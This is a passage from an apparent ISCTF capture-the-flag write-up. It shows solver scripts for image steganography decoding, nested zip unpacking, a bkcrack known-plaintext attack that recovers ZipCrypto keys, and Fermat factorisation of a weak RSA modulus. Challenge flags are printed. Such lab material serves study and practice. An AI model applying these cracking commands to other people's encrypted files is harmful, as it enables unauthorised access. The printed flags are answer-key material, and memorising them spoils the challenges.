        self<span class="token punctuation">.</span>inv4 <span class="token operator">=</span> INV_block<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>inv5 <span class="token operator">=</span> INV_block<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>inv6 <span class="token operator">=</span> INV_block<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>inv7 <span class="token operator">=</span> INV_block<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>inv8 <span class="token operator">=</span> INV_block<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">reverse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
        out <span class="token operator">=</span> self<span class="token punctuation">.</span>inv8<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        out <span class="token operator">=</span> self<span class="token punctuation">.</span>inv7<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span>out<span class="token punctuation">)</span>
        out <span class="token operator">=</span> self<span class="token punctuation">.</span>inv6<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span>out<span class="token punctuation">)</span>
        out <span class="token operator">=</span> self<span class="token punctuation">.</span>inv5<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span>out<span class="token punctuation">)</span>
        out <span class="token operator">=</span> self<span class="token punctuation">.</span>inv4<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span>out<span class="token punctuation">)</span>
        out <span class="token operator">=</span> self<span class="token punctuation">.</span>inv3<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span>out<span class="token punctuation">)</span>
        out <span class="token operator">=</span> self<span class="token punctuation">.</span>inv2<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span>out<span class="token punctuation">)</span>
        out <span class="token operator">=</span> self<span class="token punctuation">.</span>inv1<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span>out<span class="token punctuation">)</span>
        <span class="token keyword">return</span> out

<span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cuda<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>model <span class="token operator">=</span> simple_net<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> cuda<span class="token punctuation">:</span> self<span class="token punctuation">.</span>model<span class="token punctuation">.</span>cuda<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># ==========================================</span>
<span class="token comment"># 2. 强制周期解码逻辑</span>
<span class="token comment"># ==========================================</span>

<span class="token keyword">def</span> <span class="token function">solve_force</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    device <span class="token operator">=</span> torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">"cuda:0"</span> <span class="token keyword">if</span> torch<span class="token punctuation">.</span>cuda<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"cpu"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Running on: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>device<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    <span class="token comment"># 加载模型</span>
    model_wrapper <span class="token operator">=</span> Model<span class="token punctuation">(</span>cuda<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    checkpoint <span class="token operator">=</span> torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'misuha.taki'</span><span class="token punctuation">,</span> map_location<span class="token operator">=</span>device<span class="token punctuation">)</span>
    new_state_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    
    <span class="token comment"># 修复 Key，去除 model. 前缀</span>
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> checkpoint<span class="token punctuation">[</span><span class="token string">'net'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">'tmp_var'</span> <span class="token keyword">in</span> k<span class="token punctuation">:</span> <span class="token keyword">continue</span>
        new_key <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">if</span> k<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'model.'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> k
        new_state_dict<span class="token punctuation">[</span>new_key<span class="token punctuation">]</span> <span class="token operator">=</span> v
        
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        model_wrapper<span class="token punctuation">.</span>model<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>new_state_dict<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Model loaded successfully!"</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> RuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Key mismatch error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

    model_wrapper<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    dwt<span class="token punctuation">,</span> iwt <span class="token operator">=</span> DWT<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">,</span> IWT<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>
    
    <span class="token comment"># 加载图片</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'secret.png'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span> <span class="token number">450</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error: secret.png not found."</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

    <span class="token comment"># 逆向网络</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Inverting network and performing IWT..."</span><span class="token punctuation">)</span>
    transform <span class="token operator">=</span> T<span class="token punctuation">.</span>Compose<span class="token punctuation">(</span><span class="token punctuation">[</span>T<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    stego_tensor <span class="token operator">=</span> transform<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">.</span>unsqueeze<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>
    stego_dwt <span class="token operator">=</span> dwt<span class="token punctuation">(</span>stego_tensor<span class="token punctuation">)</span>
    input_reverse <span class="token operator">=</span> torch<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token punctuation">[</span>stego_dwt<span class="token punctuation">,</span> torch<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>stego_dwt<span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dim<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        output_reverse <span class="token operator">=</span> model_wrapper<span class="token punctuation">.</span>model<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span>input_reverse<span class="token punctuation">)</span>
        payload_dwt <span class="token operator">=</span> output_reverse<span class="token punctuation">.</span>narrow<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span>
        payload_img <span class="token operator">=</span> iwt<span class="token punctuation">(</span>payload_dwt<span class="token punctuation">)</span>
    
    <span class="token comment"># 提取原始比特流</span>
    payload_flat <span class="token operator">=</span> payload_img<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cpu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span>
    raw_bits <span class="token operator">=</span> <span class="token punctuation">(</span>payload_flat <span class="token operator">></span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>

    <span class="token comment"># === 关键：强制使用 1376 作为周期 ===</span>
    PERIOD <span class="token operator">=</span> <span class="token number">1376</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Forcing Period: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>PERIOD<span class="token punctuation">&#125;</span></span><span class="token string"> bits"</span></span><span class="token punctuation">)</span>
    
    num_copies <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>raw_bits<span class="token punctuation">)</span> <span class="token operator">//</span> PERIOD
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Averaging </span><span class="token interpolation"><span class="token punctuation">&#123;</span>num_copies<span class="token punctuation">&#125;</span></span><span class="token string"> copies of the data..."</span></span><span class="token punctuation">)</span>
    
    truncated_len <span class="token operator">=</span> num_copies <span class="token operator">*</span> PERIOD
    reshaped <span class="token operator">=</span> raw_bits<span class="token punctuation">[</span><span class="token punctuation">:</span>truncated_len<span class="token punctuation">]</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span>num_copies<span class="token punctuation">,</span> PERIOD<span class="token punctuation">)</span>
    
    <span class="token comment"># 多数投票</span>
    vote_result <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>reshaped<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    clean_bits <span class="token operator">=</span> <span class="token punctuation">(</span>vote_result <span class="token operator">></span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tolist<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 去除 padding (32bits)</span>
    clean_bits_no_pad <span class="token operator">=</span> clean_bits<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">]</span>

    <span class="token comment"># 转为字节</span>
    ints <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>clean_bits_no_pad<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        byte <span class="token operator">=</span> clean_bits_no_pad<span class="token punctuation">[</span>b <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>b <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>
        ints<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>bit<span class="token punctuation">)</span> <span class="token keyword">for</span> bit <span class="token keyword">in</span> byte<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    byte_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>ints<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Cleaned Hex: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Attempting decode..."</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># 尝试 RS 解码</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            decoded <span class="token operator">=</span> rs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>byte_data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>decoded<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">:</span> decoded <span class="token operator">=</span> decoded<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token comment"># Zlib 解压</span>
            text <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[SUCCESS] Flag found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e_rs<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"RS decode failed (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e_rs<span class="token punctuation">&#125;</span></span><span class="token string">), trying direct Zlib..."</span></span><span class="token punctuation">)</span>
            text <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>byte_data<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[SUCCESS] Flag found (Direct Zlib): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[FAIL] Final decoding error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    solve_force<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    
<span class="token comment">#ISCTF&#123;Sh4r3_S3reCTTt_wiTh_Ai_H@@@@&#125;</span></code></pre>

<h3 id="小蓝鲨的千层FLAG"><a href="#小蓝鲨的千层FLAG" class="headerlink" title="小蓝鲨的千层FLAG"></a>小蓝鲨的千层FLAG</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pyzipper
<span class="token keyword">import</span> re
<span class="token keyword">import</span> os

current_file <span class="token operator">=</span> <span class="token string">"flagggg1000.zip"</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"正在处理: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current_file<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># 改用 pyzipper.AESZipFile 打开，它支持 AES 加密</span>
        <span class="token keyword">with</span> pyzipper<span class="token punctuation">.</span>AESZipFile<span class="token punctuation">(</span>current_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zf<span class="token punctuation">:</span>
            <span class="token comment"># 1. 读取注释</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                comment <span class="token operator">=</span> zf<span class="token punctuation">.</span>comment<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span>
                <span class="token comment"># 防止注释不是utf-8编码导致报错</span>
                comment <span class="token operator">=</span> zf<span class="token punctuation">.</span>comment<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span>

            <span class="token comment"># 2. 正则提取密码</span>
            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'The password is\s+(.+)'</span><span class="token punctuation">,</span> comment<span class="token punctuation">)</span>
            
            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
                password <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token comment"># print(f"  发现密码: &#123;password&#125;") # 如果刷屏太快可以注释掉这行</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  未在注释中发现密码，可能已到达最后一层。"</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            
            <span class="token comment"># 3. 解压文件</span>
            file_list <span class="token operator">=</span> zf<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> file_list<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            
            <span class="token comment"># 设置密码并解压</span>
            zf<span class="token punctuation">.</span>setpassword<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            zf<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span><span class="token punctuation">)</span>
            
            next_file <span class="token operator">=</span> file_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            
        <span class="token comment"># 4. 删除旧文件，清理磁盘</span>
        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>current_file<span class="token punctuation">)</span>
        
        current_file <span class="token operator">=</span> next_file
        
        <span class="token comment"># 判断是否结束（看文件名后缀）</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> current_file<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n======== 成功！========"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"最终文件是: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>current_file<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>current_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"文件内容:"</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"无法读取内容，请手动查看。"</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"发生错误: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token comment"># 如果出错，不要死循环，暂停一下让用户看清</span>
        <span class="token keyword">break</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"flagggg1.zip"</span> <span class="token operator">></span> plain1.txt                            
bkcrack <span class="token parameter variable">-C</span> flagggg3.zip <span class="token parameter variable">-c</span> flagggg2.zip <span class="token parameter variable">-p</span> plain1.txt <span class="token parameter variable">-o</span> <span class="token number">30</span>  <span class="token parameter variable">-x</span> <span class="token number">0</span> 504B0304 


<span class="token punctuation">[</span><span class="token number">13</span>:45:24<span class="token punctuation">]</span> Keys
ae0c4b27 66c21cba b9a7958f

bkcrack <span class="token parameter variable">-C</span> .<span class="token punctuation">\</span>flagggg3.zip <span class="token parameter variable">-c</span> flagggg2.zip <span class="token parameter variable">-k</span> ae0c4b27 66c21cba b9a7958f  <span class="token parameter variable">-d</span> flagggg2.zip

</code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204134853.png" alt="image.png" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204134924.png" alt="image.png" loading="lazy"></p>
<p>jqW2Dg2C7HLo86yRWh3CaEXZXw8T98Mz</p>
<h3 id="小蓝鲨的神秘文件"><a href="#小蓝鲨的神秘文件" class="headerlink" title="小蓝鲨的神秘文件"></a>小蓝鲨的神秘文件</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204210419.png" alt="image.png" loading="lazy"></p>
<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251204210431.png" alt="image.png" loading="lazy"></p>
<h3 id="miscrypto"><a href="#miscrypto" class="headerlink" title="miscrypto"></a>miscrypto</h3><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206105035.png" alt="image.png" loading="lazy"></p>
<p>文件尾有base64表，图片lsb有base64值<br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206105104.png" alt="image.png" loading="lazy"><br><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206105416.png" alt="image.png" loading="lazy"></p>
<p>n可以分解</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

<span class="token comment"># 1. 输入数据</span>
<span class="token comment"># 注意：题目给的 c 是十六进制格式，需要转换</span>
c <span class="token operator">=</span><span class="token number">7551149944252504900886507115675974911138392174398403084481505554211619110839551091782778656892126244444160100583088287091700792873342921044046712035923917</span>
n <span class="token operator">=</span> <span class="token number">7644027341241571414254539033581025821232019860861753472899980529695625198016019462879314488666454640621660011189097660092595699889727595925351737140047609</span>
e <span class="token operator">=</span> <span class="token number">65537</span>

<span class="token comment"># 2. 费马分解 (Fermat Factorization)</span>
<span class="token keyword">def</span> <span class="token function">fermat_factorization</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 初始化 a 为 n 的整数平方根</span>
    a <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token comment"># 计算 b^2 = a^2 - n</span>
        b2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>square<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">-</span> n
        
        <span class="token comment"># 如果 b^2 是完全平方数，说明找到了</span>
        <span class="token keyword">if</span> b2 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token keyword">and</span> gmpy2<span class="token punctuation">.</span>is_square<span class="token punctuation">(</span>b2<span class="token punctuation">)</span><span class="token punctuation">:</span>
            b <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>b2<span class="token punctuation">)</span>
            p <span class="token operator">=</span> a <span class="token operator">+</span> b
            q <span class="token operator">=</span> a <span class="token operator">-</span> b
            <span class="token keyword">return</span> p<span class="token punctuation">,</span> q
        
        <span class="token comment"># 否则尝试下一个 a</span>
        a <span class="token operator">+=</span> <span class="token number">1</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 正在进行费马分解..."</span><span class="token punctuation">)</span>
p<span class="token punctuation">,</span> q <span class="token operator">=</span> fermat_factorization<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 分解成功!"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"p = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"q = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>q<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># 3. RSA 解密</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

<span class="token comment"># 4. 获取 Flag</span>
flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[+] Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token comment">#ISCTF&#123;M15c_10v3_Cryp70&#125;</span></code></pre>

<h3 id="消失的flag"><a href="#消失的flag" class="headerlink" title="消失的flag"></a>消失的flag</h3><pre class="language-none"><code class="language-none">root@ta0:~&#x2F;Desktop# ssh -p 21341 qyy@challenge.bluesharkinfo.com &gt; 1.txt
root@ta0:~&#x2F;Desktop# cat -A 1.txt 
ISCTF&#123;3974ede4-79ed-4f0c-9390-fb5b5a788c89&#125;^M                                           ^M$
  ___ ____   ____ _____ _____ ^M$
 |_ _&#x2F; ___| &#x2F; ___|_   _|  ___|^M$
  | |\___ \| |     | | | |_   ^M$
  | | ___) | |___  | | |  _|  ^M$
 |___|____&#x2F; \____| |_| |_|    ^M$
^M$
(base) </code></pre>

<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251206214550.png" alt="image.png" loading="lazy"></p>
<h3 id="爱玩游戏的小蓝鲨"><a href="#爱玩游戏的小蓝鲨" class="headerlink" title="爱玩游戏的小蓝鲨"></a>爱玩游戏的小蓝鲨</h3><p>恢复图片</p>
